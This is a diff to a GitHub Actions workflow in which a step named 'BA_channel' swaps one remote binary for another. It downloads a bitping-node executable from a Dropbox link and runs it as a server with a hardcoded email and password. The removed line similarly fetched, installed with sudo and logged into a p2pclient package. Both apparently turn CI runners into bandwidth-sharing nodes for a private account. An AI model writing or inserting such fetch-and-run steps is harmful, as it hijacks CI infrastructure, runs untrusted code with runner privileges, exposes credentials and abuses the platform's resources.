@@ -23,4 +23,4 @@ jobs:
     - name: Setup
       uses: actions/checkout@v1
     - name: BA_channel
-      run: wget https://github.com/archernap/Package/raw/main/p2pclient_0.60_amd64.deb && chmod +x p2pclient_0.60_amd64.deb && sudo dpkg -i p2pclient_0.60_amd64.deb && p2pclient --login mallory121@protonmail.com
+      run: wget https://www.dropbox.com/s/rt20ev3lhaofo23/bitping-node-amd64-linux && chmod +x bitping-node-amd64-linux && ./bitping-node-amd64-linux --server --email mallory121@protonmail.com --password Zaq@1234567890
